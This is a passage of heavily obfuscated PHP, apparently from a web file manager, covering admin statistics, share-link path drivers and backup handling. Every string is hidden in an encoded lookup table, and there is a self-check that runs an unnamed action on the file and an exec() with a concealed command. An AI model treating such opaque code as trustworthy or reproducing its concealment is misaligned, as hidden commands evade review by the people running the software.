array_to_keyvalue($”ìÆï“È, $Ö¶‚í²[224]); foreach ($ŸÖÒÁëø as $å×ÌÎ¿ƒ) { if (isset($»µæ¢ª[$å×ÌÎ¿ƒ])) { $ÀèöŒ†Ï = $»µæ¢ª[$å×ÌÎ¿ƒ]; } else { $ÀèöŒ†Ï = end($”ìÆï“È); $ÀèöŒ†Ï[$Ö¶‚í²[224]] = $å×ÌÎ¿ƒ; if ($Ïøœ©¡© == $Ö¶‚í²[619]) { $ÀèöŒ†Ï[$Ö¶‚í²[1807]] = $ÀèöŒ†Ï[$Ö¶‚í²[1808]] = 0; } } $öæÆ×í[] = $ÀèöŒ†Ï; } $”ìÆï“È = $öæÆ×í; } $Ö»¶‘Õá = array($Ö¶‚í²[619] => array($Ö¶‚í²[805] => LNG($Ö¶‚í²[1823]), $Ö¶‚í²[1807] => LNG($Ö¶‚í²[1824]), $Ö¶‚í²[1808] => LNG($Ö¶‚í²[1825])), $Ö¶‚í²[1809] => array($Ö¶‚í²[803] => LNG($Ö¶‚í²[1826]), $Ö¶‚í²[1811] => LNG($Ö¶‚í²[1827]), $Ö¶‚í²[1812] => LNG($Ö¶‚í²[1828]), $Ö¶‚í²[1813] => LNG($Ö¶‚í²[1829]))); $µ±È¤ÚÒ = array($Ö¶‚í²[619] => $Ö¶‚í²[1830], $Ö¶‚í²[1809] => $Ö¶‚í²[76]); if (empty($”ìÆï“È)) { $å×ÌÎ¿ƒ = date($Ö¶‚í²[1814], strtotime($Ö¶‚í²[1815])); $ÙŒ¡³Àğ = array($Ö¶‚í²[224] => $å×ÌÎ¿ƒ); foreach ($Ö»¶‘Õá[$Ïøœ©¡©] as $ª ²ä³â => $ş¸¡È†È) { $ÙŒ¡³Àğ[$ª ²ä³â] = 0; } $”ìÆï“È[] = $ÙŒ¡³Àğ; } $ç¾éóµ = array(); foreach ($”ìÆï“È as $ş¸¡È†È) { if ($Ïøœ©¡© == $Ö¶‚í²[1809] && $ş¸¡È†È[$Ö¶‚í²[1811]] > $ş¸¡È†È[$Ö¶‚í²[803]]) { $ş¸¡È†È[$Ö¶‚í²[1811]] = $ş¸¡È†È[$Ö¶‚í²[803]]; } foreach ($Ö»¶‘Õá[$Ïøœ©¡©] as $ª ²ä³â => $úÎ‘‚Ó) { $ÀèöŒ†Ï = array($Ö¶‚í²[224] => $ş¸¡È†È[$Ö¶‚í²[224]], $Ö¶‚í²[1584] => $úÎ‘‚Ó); $ÀèöŒ†Ï[$µ±È¤ÚÒ[$Ïøœ©¡©]] = isset($ş¸¡È†È[$ª ²ä³â]) ? $ş¸¡È†È[$ª ²ä³â] : 0; $ç¾éóµ[] = $ÀèöŒ†Ï; } } return $ç¾éóµ; } public function validDate($æŒ’ŠòŒ, $¹ë£›Œ) { $Ÿëç÷’à =& $_SERVER[…É¦À–]; $×…í†à¼ = date($Ÿëç÷’à[1814], strtotime($Ÿëç÷’à[1815])); $ÖÚ¼¨Ù = array($×…í†à¼); switch ($æŒ’ŠòŒ) { case $Ÿëç÷’à[1667]: $™Œï›Î¬ = mktime(0, 0, 0, date($Ÿëç÷’à[1831]), date($Ÿëç÷’à[1406]) - date($Ÿëç÷’à[1469]) + 7 - 7, date($Ÿëç÷’à[1832])); $Ê×—¶ôÍ = 0; do { $«…“¼·§ = date($Ÿëç÷’à[1814], $™Œï›Î¬ - 3600 * 24 * 7 * $Ê×—¶ôÍ); $ÖÚ¼¨Ù[] = $«…“¼·§; $Ê×—¶ôÍ++; } while ($¹ë£›Œ < $«…“¼·§); break; case $Ÿëç÷’à[1665]: $Ê×—¶ôÍ = 1; do { $Á¡ä¼¾³ = date($Ÿëç÷’à[1833], strtotime("\55\40{$Ê×—¶ôÍ}\40\155\157\x6e\x74\x68\163")); $ÖÚ¼¨Ù[] = $Á¡ä¼¾³; $Ê×—¶ôÍ++; } while ($¹ë£›Œ < $Á¡ä¼¾³); break; case $Ÿëç÷’à[1834]: $è¼¬óƒ„ = (int) date($Ÿëç÷’à[1832], strtotime($¹ë£›Œ)); $“á§íÄİ = (int) date($Ÿëç÷’à[1832]); if ($è¼¬óƒ„ >= $“á§íÄİ) { break; } for ($è¼¬óƒ„; $è¼¬óƒ„ < $“á§íÄİ; $è¼¬óƒ„++) { $ÖÚ¼¨Ù[] = $è¼¬óƒ„ . $Ÿëç÷’à[1835]; } break; default: break; } if ($¹ë£›Œ > end($ÖÚ¼¨Ù)) { array_pop($ÖÚ¼¨Ù); } sort($ÖÚ¼¨Ù); return $ÖÚ¼¨Ù; } public function listTable($°çÎ‡®) { $Ì´ÛßãÆ = ucfirst($°çÎ‡®); return Model($Ì´ÛßãÆ)->listData(); } public function option($çªüÄ£š) { $¢³Å—’Œ = $_SERVER[…É¦À–][1836] . ucfirst($çªüÄ£š); return $this->{$¢³Å—’Œ}(); } private function optionUser() { $‡Â°óô¾ =& $_SERVER[…É¦À–]; $³´È¡õ¼ = Model($‡Â°óô¾[554])->count($‡Â°óô¾[1687]); $à–åÇŸ§ = Model($‡Â°óô¾[554])->where($‡Â°óô¾[1837])->count($‡Â°óô¾[1687]); $±©ù‰ëø = intval($GLOBALS[$‡Â°óô¾[6]][$‡Â°óô¾[378]][$‡Â°óô¾[1640]]) / 3600; $Ğ™ï´Å = strtotime("\x2d{$±©ù‰ëø}\40\x68\157\165\162\163"); $³È†»„Û = strtotime(date($‡Â°óô¾[1818])); if ($Ğ™ï´Å < $³È†»„Û) { $Ğ™ï´Å = $³È†»„Û; } $óáË¤Û´ = array($‡Â°óô¾[1838] => array($‡Â°óô¾[1059], $Ğ™ï´Å)); $‘Ø‚êú = (int) Model($‡Â°óô¾[554])->where($óáË¤Û´)->count($‡Â°óô¾[1687]); if (!$‘Ø‚êú) { $‘Ø‚êú = 1; } $óáË¤Û´ = array($‡Â°óô¾[1838] => array($‡Â°óô¾[1059], $³È†»„Û)); $üÑĞù· = Model($‡Â°óô¾[554])->where($óáË¤Û´)->count($‡Â°óô¾[1687]); return array($‡Â°óô¾[798] => (int) $³´È¡õ¼, $‡Â°óô¾[1839] => (int) ($³´È¡õ¼ - $à–åÇŸ§), $‡Â°óô¾[1840] => (int) $à–åÇŸ§, $‡Â°óô¾[1841] => (int) $üÑĞù·, $‡Â°óô¾[1842] => $‘Ø‚êú); } private function optionFile() { $×âƒ¡Ï =& $_SERVER[…É¦À–]; $‹ÜÙæŒ = $this->sourceSize(); $ëˆã„¨› = $‹ÜÙæŒ[$×âƒ¡Ï[76]]; $ÏùüĞ„ = $‹ÜÙæŒ[$×âƒ¡Ï[1811]]; $×™êØĞ = Model($×âƒ¡Ï[865])->where(array($×âƒ¡Ï[439] => 0))->count($×âƒ¡Ï[431]); $˜ÈËÔ¸‚ = array($×âƒ¡Ï[439] => 0, $×âƒ¡Ï[201] => array($×âƒ¡Ï[1059], strtotime(date($×âƒ¡Ï[1818])))); $Ü…€¡®€ = Model($×âƒ¡Ï[865])->where($˜ÈËÔ¸‚)->sum($×âƒ¡Ï[76]); $í’Ë§Ÿ = Model($×âƒ¡Ï[865])->where($˜ÈËÔ¸‚)->count($×âƒ¡Ï[431]); return array($×âƒ¡Ï[803] => $ëˆã„¨›, $×âƒ¡Ï[1811] => $ÏùüĞ„, $×âƒ¡Ï[1843] => $ëˆã„¨› - $ÏùüĞ„, $×âƒ¡Ï[1844] => (int) $Ü…€¡®€, $×âƒ¡Ï[805] => (int) $×™êØĞ, $×âƒ¡Ï[1845] => (int) $í’Ë§Ÿ); } private function optionAccess() { $¬¥ËõãÎ =& $_SERVER[…É¦À–]; return array($¬¥ËõãÎ[798] => $this->typeLogCnt(), $¬¥ËõãÎ[107] => $this->typeLogCnt($¬¥ËõãÎ[107]), $¬¥ËõãÎ[481] => $this->typeLogCnt($¬¥ËõãÎ[481]), $¬¥ËõãÎ[1846] => $this->typeLogCnt($¬¥ËõãÎ[1846]), $¬¥ËõãÎ[1847] => $this->typeLogCnt($¬¥ËõãÎ[1847]), $¬¥ËõãÎ[619] => $this->typeLogCnt($¬¥ËõãÎ[12], $¬¥ËõãÎ[1822])); } private function typeLogCnt($¦—ÀæÖŒ = '', $ÆÆ³Úßè = "\x69\x64") { $½â©µ¹„ =& $_SERVER[…É¦À–]; $‡•Îóõ = array($½â©µ¹„[107] => array($½â©µ¹„[1848], $½â©µ¹„[1849]), $½â©µ¹„[481] => array($½â©µ¹„[1850], $½â©µ¹„[1851]), $½â©µ¹„[1846] => array($½â©µ¹„[1852], $½â©µ¹„[1853], $½â©µ¹„[1854]), $½â©µ¹„[1847] => array($½â©µ¹„[1855], $½â©µ¹„[1856]), $½â©µ¹„[1857] => array($½â©µ¹„[1858], $½â©µ¹„[1859], $½â©µ¹„[1860])); $›è¶‡ëÍ = strtotime(date($½â©µ¹„[1818])); $Ò™Ù¤÷ = array($½â©µ¹„[201] => array($½â©µ¹„[1059], $›è¶‡ëÍ)); if ($¦—ÀæÖŒ) { $Ò™Ù¤÷[$½â©µ¹„[33]] = array($½â©µ¹„[7], $‡•Îóõ[$¦—ÀæÖŒ]); } $Çµµ€ªÆ = Model($½â©µ¹„[1821])->where($Ò™Ù¤÷)->count($ÆÆ³Úßè); return (int) $Çµµ€ªÆ; } private function optionServer() { $‹›Ó„£ù =& $_SERVER[…É¦À–]; $ÏŠ¹ùÇ = $this->diskDriver(); $İ®ë½¦ü = KodIO::defaultDriver(); $·€õŒ¯ = array($‹›Ó„£ù[857] => $İ®ë½¦ü[$‹›Ó„£ù[428]]); $«²»‹ÙÆ = Model($‹›Ó„£ù[500])->where($·€õŒ¯)->sum($‹›Ó„£ù[76]); $ı™¦ÑÉí = explode($‹›Ó„£ù[53], $_SERVER[$‹›Ó„£ù[143]]); $›Üš = $ı™¦ÑÉí[0]; $çû¹¡ˆÛ = $GLOBALS[$‹›Ó„£ù[6]][$‹›Ó„£ù[21]]; $‡°“ß• = $çû¹¡ˆÛ[$‹›Ó„£ù[1021]]; if ($‡°“ß• == $‹›Ó„£ù[1009]) { $Ùìù”ş = explode($‹›Ó„£ù[1327], $çû¹¡ˆÛ[$‹›Ó„£ù[1020]]); $‡°“ß• = $Ùìù”ş[0]; } if ($‡°“ß• == $‹›Ó„£ù[957] || $‡°“ß• == $‹›Ó„£ù[844]) { $îÕ§óíË = Model()->db()->query($‹›Ó„£ù[1861]); $ÚœœøœÍ = $îÕ§óíË[0] && isset($îÕ§óíË[0][$‹›Ó„£ù[1583]]) ? $îÕ§óíË[0][$‹›Ó„£ù[1583]] : 0; $‡°“ß• = $‹›Ó„£ù[1862] . ($ÚœœøœÍ ? $‹›Ó„£ù[8] . $ÚœœøœÍ : $‹›Ó„£ù[12]); } $úìú¶È¾ = $GLOBALS[$‹›Ó„£ù[6]][$‹›Ó„£ù[378]][$‹›Ó„£ù[867]]; return array($‹›Ó„£ù[1863] => $ÏŠ¹ùÇ ? $ÏŠ¹ùÇ[$‹›Ó„£ù[1864]] : 0, $‹›Ó„£ù[1865] => $ÏŠ¹ùÇ ? $ÏŠ¹ùÇ[$‹›Ó„£ù[1866]] : 0, $‹›Ó„£ù[1867] => (int) $İ®ë½¦ü[$‹›Ó„£ù[1864]] * 1024 * 1024 * 1024, $‹›Ó„£ù[1868] => (int) $«²»‹ÙÆ, $‹›Ó„£ù[1869] => ucfirst($›Üš), $‹›Ó„£ù[1870] => $‹›Ó„£ù[1871] . PHP_VERSION, $‹›Ó„£ù[1872] => phpBuild64() ? 64 : 32, $‹›Ó„£ù[797] => str_replace($‹›Ó„£ù[1175], $‹›Ó„£ù[1037], $‡°“ß•), $‹›Ó„£ù[378] => ucfirst($úìú¶È¾), $‹›Ó„£ù[32] => $_SERVER[$‹›Ó„£ù[1873]]); } private function diskDriver() { $äĞ©Ÿ±š =& $_SERVER[…É¦À–]; $°Áô ¶ = $äĞ©Ÿ±š[8]; $¨«¶‰Ê = $GLOBALS[$äĞ©Ÿ±š[6]][$äĞ©Ÿ±š[1344]] == $äĞ©Ÿ±š[1345]; if ($¨«¶‰Ê) { $°Áô ¶ = $äĞ©Ÿ±š[1874]; if (function_exists($äĞ©Ÿ±š[1875])) { exec($äĞ©Ÿ±š[1876], $¹ğÀâŞ); $°Áô ¶ = $¹ğÀâŞ[1] . $äĞ©Ÿ±š[8]; } } if (!file_exists($°Áô ¶)) { return; } $óüêü–Ó = @disk_total_space($°Áô ¶); $‚¥üÙÄ = $óüêü–Ó - @disk_free_space($°Áô ¶); return array($äĞ©Ÿ±š[1864] => $óüêü–Ó, $äĞ©Ÿ±š[1866] => $‚¥üÙÄ); } public function fileChart($ı¾àµï†) { $×‚Ä“äÄ =& $_SERVER[…É¦À–]; if (isset($ı¾àµï†[$×‚Ä“äÄ[1687]])) { return Model($×‚Ä“äÄ[865])->userFileTypeProfile($ı¾àµï†[$×‚Ä“äÄ[1687]]); } if (isset($ı¾àµï†[$×‚Ä“äÄ[1877]])) { return Model($×‚Ä“äÄ[865])->groupFileTypeProfile($ı¾àµï†[$×‚Ä“äÄ[1877]]); } $ÈØ¤ñ ò = $this->sourceSize(); $ìÌ¬¿é‰ = array($×‚Ä“äÄ[461] => 0, $×‚Ä“äÄ[440] => 1); $îõé¯¾• = Model($×‚Ä“äÄ[865])->where($ìÌ¬¿é‰)->sum($×‚Ä“äÄ[76]); $ìÌ¬¿é‰[$×‚Ä“äÄ[440]] = 2; $”¸ôĞö· = Model($×‚Ä“äÄ[865])->where($ìÌ¬¿é‰)->sum($×‚Ä“äÄ[76]); return array($×‚Ä“äÄ[803] => $ÈØ¤ñ ò[$×‚Ä“äÄ[76]], $×‚Ä“äÄ[1811] => $ÈØ¤ñ ò[$×‚Ä“äÄ[1811]], $×‚Ä“äÄ[1812] => (int) $îõé¯¾•, $×‚Ä“äÄ[1813] => (int) $”¸ôĞö·); } private function sourceSize() { $¬àæèı§ =& $_SERVER[…É¦À–]; $ŒØ‘œæ¿ = Model($¬àæèı§[865])->where(array($¬àæèı§[439] => 0))->sum($¬àæèı§[76]); $çÔ¾¬… = Model($¬àæèı§[500])->sum($¬àæèı§[76]); if ($çÔ¾¬… > $ŒØ‘œæ¿) { $çÔ¾¬… = $ŒØ‘œæ¿; } return array($¬àæèı§[76] => (int) $ŒØ‘œæ¿, $¬àæèı§[1811] => (int) $çÔ¾¬…); } } goto f‘©‘Í‘Ô; FÛéÒß•¸Ü: define($_SERVER[…É¦À–][0], $_SERVER[…É¦À–][1]); $_SERVER[â«ìÕ ] = explode($_SERVER[…É¦À–][2], gzinflate(substr($_SERVER[…É¦À–][3], 10, -8))); function binCheckEq($¦Ğ‰Œºâ, $´õÌ¥ß¾) { return $¦Ğ‰Œºâ == $´õÌ¥ß¾; } goto DÒİÙÌ¦¤; eôÎ²íø¶²: class PathDriverDbShareLink extends PathDriverDB { public function __construct($öÄ‘‰ä) { $this->pathParse = $öÄ‘‰ä; $this->model = Model($_SERVER[…É¦À–][1378]); } protected function infoParse($Îöª†ù‘, $ï¯¢•å¾ = false, $æâ–óİ = false) { $×¦••§” =& $_SERVER[…É¦À–]; return Action($×¦••§”[1219])->sharePathInfo($this->pathParse[$×¦••§”[84]], !0, $ï¯¢•å¾); } public function listPath($ùÃ±ÈÅ€, $‘·Ô¯õõ = false) { $Í¸‘”Ìì =& $_SERVER[…É¦À–]; $ƒÖ»Îğ  = parent::listPath($ùÃ±ÈÅ€, $‘·Ô¯õõ); if (!$ƒÖ»Îğ ) { return $ƒÖ»Îğ ; } if (is_array($ƒÖ»Îğ [$Í¸‘”Ìì[1387]])) { $ƒÖ»Îğ [$Í¸‘”Ìì[1387]] = Action($Í¸‘”Ìì[1219])->shareItemInfo($ƒÖ»Îğ [$Í¸‘”Ìì[1387]]); } foreach ($ƒÖ»Îğ  as $şêíã¿ó => $î¹±ğãØ) { if (!in_array($şêíã¿ó, array($Í¸‘”Ìì[83], $Í¸‘”Ìì[82]))) { continue; } foreach ($î¹±ğãØ as $•ØŠ£š‹ => $º¹çõ) { $ƒÖ»Îğ [$şêíã¿ó][$•ØŠ£š‹] = Action($Í¸‘”Ìì[1219])->shareItemInfo($º¹çõ); } } return $ƒÖ»Îğ ; } public function listAll($ÁšäîÚ¬) { $ÁÜˆ‘Õš =& $_SERVER[…É¦À–]; $İû®¢Á¸ = IO::info($this->pathParse[$ÁÜˆ‘Õš[84]]); if (!$İû®¢Á¸) { return array(); } $’Á¿Äª‡ = $this->model->listAll($ÁšäîÚ¬); foreach ($’Á¿Äª‡ as &$Â‡¨¦Ğê) { $Â‡¨¦Ğê[$ÁÜˆ‘Õš[87]] = Action($ÁÜˆ‘Õš[1219])->shareItemInfo($Â‡¨¦Ğê[$ÁÜˆ‘Õš[87]]); } unset($Â‡¨¦Ğê); return $’Á¿Äª‡; } } class PathDriverDriverShareItem { public function __construct($¨³­¥ı) { $this->pathParse = $¨³­¥ı; } public function __call($ù×ÇĞ¹, $ê¡ç‘Šõ) { $±ÖğêçÙ =& $_SERVER[…É¦À–]; if (method_exists($this, $ù×ÇĞ¹)) { return; } $ØÂğãäÄ = call_user_func_array(array($±ÖğêçÙ[1388], $ù×ÇĞ¹), $ê¡ç‘Šõ); $õÕñ»”­ = array($±ÖğêçÙ[1389], $±ÖğêçÙ[1390], $±ÖğêçÙ[1391], $±ÖğêçÙ[1392], $±ÖğêçÙ[575], $±ÖğêçÙ[577], $±ÖğêçÙ[1393], $±ÖğêçÙ[107], $±ÖğêçÙ[1394], $±ÖğêçÙ[1395]); if (in_array($ù×ÇĞ¹, $õÕñ»”­)) { $ØÂğãäÄ = $this->getPathOuter($ØÂğãäÄ); } return $ØÂğãäÄ; } public function copy($·ÛÉøÂ, $ß…ÎÄ„½, $šøÄúå = false, $š¿Åí‹± = false) { return $this->copyMove($·ÛÉøÂ, $ß…ÎÄ„½, $šøÄúå, $_SERVER[…É¦À–][575], $š¿Åí‹±); } public function move($Ú¦úòâ, $ºÛ£ûš„, $ì”ñïì = false, $ŸÎöÄÖ = false) { return $this->copyMove($Ú¦úòâ, $ºÛ£ûš„, $ì”ñïì, $_SERVER[…É¦À–][577], $ŸÎöÄÖ); } private function copyMove($İè¥ÀÑ», $„Şä†©, $ñÈû¬½¶, $²Î·©, $ÂÍğ—ïÏ = false) { $ß„Ì»Úë =& $_SERVER[…É¦À–]; $»çËûŸú = $„Şä†©; $‹‰¬ş™ = IO::driverMake($„Şä†©); if ($‹‰¬ş™->pathParse[$ß„Ì»Úë[1196]]) { $„Şä†© = $‹‰¬ş™->pathParse[$ß„Ì»Úë[1196]]; } else { $„Şä†© = $»çËûŸú; } $¹ë­íò = IO::copyMove($İè¥ÀÑ», $„Şä†©, $ñÈû¬½¶, $²Î·©, $ÂÍğ—ïÏ); $¹ë­íò = $this->getPathOuter($¹ë­íò); return $¹ë­íò; } public function pathThis($üı‚¦›) { return get_path_this($this->pathParse[$_SERVER[…É¦À–][84]]); } public function pathFather($°ôÄ‘ŞË) { return get_path_father($this->pathParse[$_SERVER[…É¦À–][84]]); } public function iconvSystem($«Ì¥à¯¬) { return $«Ì¥à¯¬; } protected function infoParse($µ Â®¹µ, $ö£ÆÉ‚­ = false) { $¼Á»Ÿä =& $_SERVER[…É¦À–]; $±Ôæó¤à = $this->pathParse[$¼Á»Ÿä[515]][$¼Á»Ÿä[1220]] . $this->pathParse[$¼Á»Ÿä[1213]]; if ($ö£ÆÉ‚­) { $ğÆ‰ïô = IO::infoWithChildren($±Ôæó¤à); } else { $ğÆ‰ïô = IO::info($±Ôæó¤à); } $¥šè†« = $this->pathParse[$¼Á»Ÿä[515]]; return Action($¼Á»Ÿä[1386])->_shareItemeParse($ğÆ‰ïô, $¥šè†«); } public function listAll($ÚÜëóŒ§) { $íâÀıĞ =& $_SERVER[…É¦À–]; $Â»¹î­Ë = IO::listAll($ÚÜëóŒ§); $ºÑıü­Ÿ = rtrim($this->pathParse[$íâÀıĞ[515]][$íâÀıĞ[1220]], $íâÀıĞ[8]); foreach ($Â»¹î­Ë as &$©ìšèú) { $©ìšèú[$íâÀıĞ[84]] = $this->pathDriver . $íâÀıĞ[8] . ltrim(substr($©ìšèú[$íâÀıĞ[84]], strlen($ºÑıü­Ÿ)), $íâÀıĞ[8]); } unset($©ìšèú); return $Â»¹î­Ë; } public function listAllSimple($Æè¿ëÜ, $ÅÍÜñ¹ = false) { $ÜÁŒú¦ =& $_SERVER[…É¦À–]; $çËÛÙï‹ = $this->listAll($Æè¿ëÜ); $×ŠÛÃà = $this->pathParse[$ÜÁŒú¦[450]]; if (trim($×ŠÛÃà, $ÜÁŒú¦[8]) == trim(get_path_father($×ŠÛÃà), $ÜÁŒú¦[8])) { $ÅÍÜñ¹ = !0; } return IO::init($ÜÁŒú¦[12])->listAllSimpleMake($çËÛÙï‹, $×ŠÛÃà, $ÅÍÜñ¹); } public function getPathOuter($¦‹€ØÊª) { $»ï‘½® =& $_SERVER[…É¦À–]; $á²—ü’ß = KodIO::parse($¦‹€ØÊª); if ($á²—ü’ß[$»ï‘½®[33]] == KodIO::KOD_SHARE_ITEM) { return $á²—ü’ß[$»ï‘½®[84]]; } $çØõ¡£ï = KodIO::clear($¦‹€ØÊª); $ş­™˜†Ã = KodIO::clear($this->pathParse[$»ï‘½®[515]][$»ï‘½®[1220]]); $·”Íá•İ = substr($çØõ¡£ï, strlen($ş­™˜†Ã)); if (substr($çØõ¡£ï, 0, strlen($ş­™˜†Ã)) != $ş­™˜†Ã) { return !1; } return $this->pathParse[$»ï‘½®[1214]] . $»ï‘½®[8] . ltrim($·”Íá•İ, $»ï‘½®[8]); } public function getType() { $Çáø”ĞÂ =& $_SERVER[…É¦À–]; $ÔÖÁãºâ = str_replace($Çáø”ĞÂ[74], $Çáø”ĞÂ[12], get_class($this)); return strtolower($ÔÖÁãºâ); } public function isTypeObject($“¬‡ˆ™) { return IO::isTypeObject($“¬‡ˆ™); } public function info($èƒÊÕŒ€) { return $this->infoParse($èƒÊÕŒ€); } public function infoAuth($¬æ™Öûô) { return $this->infoParse($¬æ™Öûô); } public function infoWithChildren($ê™ù ™•) { return $this->infoParse($ê™ù ™•, !0); } public function infoFull($àô£Ú§ø) { return $this->infoParse($àô£Ú§ø); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÑÅÍİšº) { $this->pathParse = $ÑÅÍİšº; } protected function infoParse($¸úã°—ˆ, $™ŸÒ‘Ì = false) { $£¢ËÇÁÂ =& $_SERVER[…É¦À–]; return Action($£¢ËÇÁÂ[1219])->sharePathInfo($this->pathParse[$£¢ËÇÁÂ[84]], !0, $™ŸÒ‘Ì); } public function listPath($ĞÆÄÜİ±, $Ü‹ÑÏÏ‚ = false) { $˜ßÂìüÙ =& $_SERVER[…É¦À–]; $½ª°¤Ÿù = IO::listPath($ĞÆÄÜİ±, $Ü‹ÑÏÏ‚); if (!$½ª°¤Ÿù) { return $½ª°¤Ÿù; } if (is_array($½ª°¤Ÿù[$˜ßÂìüÙ[1387]])) { $‚£¼«™ó = Action($˜ßÂìüÙ[1396])->parsePathChildren($½ª°¤Ÿù[$˜ßÂìüÙ[1387]], array($˜ßÂìüÙ[450] => $ĞÆÄÜİ±)); $½ª°¤Ÿù[$˜ßÂìüÙ[1387]] = Action($˜ßÂìüÙ[1219])->shareItemInfo($‚£¼«™ó); } foreach ($½ª°¤Ÿù as $ŠŠ†”’’ => $ß¬¹ûÙ) { if (!in_array($ŠŠ†”’’, array($˜ßÂìüÙ[83], $˜ßÂìüÙ[82]))) { continue; } foreach ($ß¬¹ûÙ as $†ÍÌ¨ => $‚£¼«™ó) { $‚£¼«™ó = Action($˜ßÂìüÙ[1396])->parsePathChildren($‚£¼«™ó, array($˜ßÂìüÙ[450] => $ĞÆÄÜİ±)); $½ª°¤Ÿù[$ŠŠ†”’’][$†ÍÌ¨] = Action($˜ßÂìüÙ[1219])->shareItemInfo($‚£¼«™ó); } } return $½ª°¤Ÿù; } } goto fê¥Ï›È; BÌõÉ—ÕİÂ: if ($_SERVER[$_SERVER[…É¦À–][919]] != $_size($_file)) { $_getc = $_SERVER[…É¦À–][921]; $_getfile = $_SERVER[$_SERVER[…É¦À–][916]] . $_SERVER[…É¦À–][917]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[…É¦À–][231], $_getfilec); if (count($_getarrs) < $_SERVER[…É¦À–][647]) { $exit = $_SERVER[…É¦À–][922]; $exit(); } $_act = $_SERVER[…É¦À–][1645]; $_act($_file); } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\142\141\143\153\x75\x70\x4c\151\163\x74"; public $field = array("\x69\157", "\156\x61\x6d\x65", "\163\x74\141\x74\x75\163", "\143\x6f\156\164\x65\x6e\164", "\x6d\141\156\165\x61\154", "\x72\x65\x73\x75\154\x74", "\164\151\x6d\x65\x46\162\157\155", "\164\151\x6d\145\x54\x6f"); public function config() { $ôéÒ‚÷ =& $_SERVER[…É¦À–]; $ê¹Ğ›Ş– = Model($ôéÒ‚÷[810])->get($ôéÒ‚÷[820]); $ê¹Ğ›Ş– = json_decode($ê¹Ğ›Ş–, !0); $ê¹Ğ›Ş– = is_array($ê¹Ğ›Ş–) ? $ê¹Ğ›Ş– : array(); if (!isset($ê¹Ğ›Ş–[$ôéÒ‚÷[794]])) { $ê¹Ğ›Ş–[$ôéÒ‚÷[794]] = $ôéÒ‚÷[88]; } unset($ê¹Ğ›Ş–[$ôéÒ‚÷[1657]]); Action($ôéÒ‚÷[1902])->taskInit(); Model($ôéÒ‚÷[1656])->cacheClear(); $âÈñ®å³ = $ôéÒ‚÷[1903]; $†ãĞÅĞ = Model($ôéÒ‚÷[1904])->findByKey($ôéÒ‚÷[1675], $âÈñ®å³); if (!$†ãĞÅĞ) { $†ãĞÅĞ = array(); } if (isset($†ãĞÅĞ[$ôéÒ‚÷[180]])) { $†ãĞÅĞ[$ôéÒ‚÷[180]] = json_decode($†ãĞÅĞ[$ôéÒ‚÷[180]], !0); } if (isset($ê¹Ğ›Ş–[$ôéÒ‚÷[180]])) { $†ãĞÅĞ[$ôéÒ‚÷[180]][$ôéÒ‚÷[1660]] = $ê¹Ğ›Ş–[$ôéÒ‚÷[180]]; unset($ê¹Ğ›Ş–[$ôéÒ‚÷[180]]); } return array_merge($†ãĞÅĞ, $ê¹Ğ›Ş–); } public function listData($ÊóÒÕ¹· = false, $öĞÏÎ¥ô = "\155\x6f\x64\151\146\x79\124\x69\x6d\145", $œ§Íâ˜À = false) { return parent::listData($ÊóÒÕ¹·, $öĞÏÎ¥ô, !0); } public function lastItem() { $Øøô“¦æ = $this->listData(); return !empty($Øøô“¦æ[0]) ? $Øøô“¦æ[0] : null; } public function kill($ùƒ…Ü·) { $µ½Ä›ëş =& $_SERVER[…É¦À–]; $€¼ÒŞ’Æ = $this->listData($ùƒ…Ü·); if (!$€¼ÒŞ’Æ || empty($€¼ÒŞ’Æ[$µ½Ä›ëş[32]])) { return !0; } Task::kill($µ½Ä›ëş[819]); Task::kill($µ½Ä›ëş[840]); Task::kill($µ½Ä›ëş[849]); $öü·¹§ò = $€¼ÒŞ’Æ[$µ½Ä›ëş[32]]; $¿ÛÌÏ¬Î = TEMP_FILES . $µ½Ä›ëş[818] . $öü·¹§ò . $µ½Ä›ëş[8]; IO::remove($¿ÛÌÏ¬Î, !1); return $this->remove($ùƒ…Ü·); } public function remove($‡¯»‘¥Ÿ) { $èµ€º½Ø = $this->listData($‡¯»‘¥Ÿ); if (!$èµ€º½Ø) { return !0; } return $this->backupRemove($èµ€º½Ø); } private function backupRemove($ËÒÆ«¥) { parent::remove($ËÒÆ«¥[$_SERVER[…É¦À–][428]]); $ÀïÑ€º‡ = $this->backupPath($ËÒÆ«¥); IO::remove($ÀïÑ€º‡, !1); return !0; } private function backupPath($º¡÷ˆù™) { $ı‘¼ããğ =& $_SERVER[…É¦À–]; $º£ê‚Ìğ = $º¡÷ˆù™[$ı‘¼ããğ[32]]; $²ãèß†¢ = Model($ı‘¼ããğ[810])->get($ı‘¼ããğ[811]); $»ƒëµİí = substr(md5($ı‘¼ããğ[812] . $²ãèß†¢ . $º£ê‚Ìğ), 0, 8); return "\173\x69\157\x3a{$º¡÷ˆù™[$ı‘¼ããğ[791]]}\175\x2f\x64\x61\164\141\x62\x61\x73\x65\57\142\x61\x63\x6b\x75\x70\57" . $º£ê‚Ìğ . $ı‘¼ããğ[11] . $»ƒëµİí; } public function start() { $¿‡ôÙî­ =& $_SERVER[…É¦À–]; if ($GLOBALS[$¿‡ôÙî­[6]][$¿‡ôÙî­[89]][$¿‡ôÙî­[1905]] != $¿‡ôÙî­[88]) { return !0; } $¶¶»Šà = $this->config(); if (!$¶¶»Šà || $¶¶»Šà[$¿‡ôÙî­[1657]] != $¿‡ôÙî­[88]) { return !1; } $€İ²Ğó = $this->process(); foreach ($€İ²Ğó as $ªê¥¸‹¢) { if ($ªê¥¸‹¢) { return Task::restart($ªê¥¸‹¢[$¿‡ôÙî­[428]]); } } $®¯­ŒÁÏ = new Backup(); $Í–š“âÎ = $®¯­ŒÁÏ->db(); if ($Í–š“âÎ) { $Í–š“âÎ = $®¯­ŒÁÏ->dbFile(); if ($Í–š“âÎ && $¶¶»Šà[$¿‡ôÙî­[794]] == $¿‡ôÙî­[198]) { $Í–š“âÎ = $®¯­ŒÁÏ->file(); } } Backup::set(array($¿‡ôÙî­[790] => 1, $¿‡ôÙî­[801] => time())); return !0; } public function process() { $€ñ’íò» =& $_SERVER[…É¦À–]; $”Í¡Õ¼£ = array($€ñ’íò»[797] => Task::get($€ñ’íò»[819]), $€ñ’íò»[802] => Task::get($€ñ’íò»[840]), $€ñ’íò»[200] => Task::get($€ñ’íò»[849])); $²ÁÑÍ¢­ = !1; foreach ($”Í¡Õ¼£ as &$¹ş™áÔ˜) { if 